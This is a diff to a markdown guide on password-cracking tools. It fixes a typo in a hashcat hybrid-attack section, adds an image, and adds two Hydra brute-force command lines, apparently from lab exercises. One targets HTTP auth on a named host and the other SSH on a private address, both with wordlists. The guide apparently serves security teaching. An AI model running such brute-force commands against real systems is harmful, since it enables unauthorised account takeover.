@@ -698,7 +698,7 @@ If you still have no idea what just happened, try the following pages:
 
 #### Hybrid Attack (from https://hashcat.net/wiki/doku.php?id=hybrid_attack)
 
-##### Decription
+##### Description
 
 Basically, the hybrid attack is just a Combinator attack. One side is simply a dictionary, the other is the result of a Brute-Force attack. In other words, the full Brute-Force keyspace is either appended or prepended to each of the words from the dictionary. That's why it's called “hybrid”.
 
@@ -764,6 +764,8 @@ generates the following password candidates:
 .
 9999hello
 ```
+Other implementation examples:
+![image](https://github.com/user-attachments/assets/937c25cf-7405-4471-ade8-cb33b644e204)
 
 ### John the Ripper
 
@@ -1019,6 +1021,11 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2014-05-19 07:53:33
 [DATA] 6 tasks, 1 server, 1003 login tries (l:1/p:1003), ~167 tries per task
 [DATA] attacking service ssh on port 22
 
+```
+Other usage examples (from labs):
+```
+hydra -V -l istheory -P /usr/share/wordlists/rockyou.txt http-get://is.theorizeit.org/auth/
+hydra -s 22 -V -d -L user.txt -P pass.txt -t16 10.0.2.5 ssh
 ```
 
 ### Cain and Abel
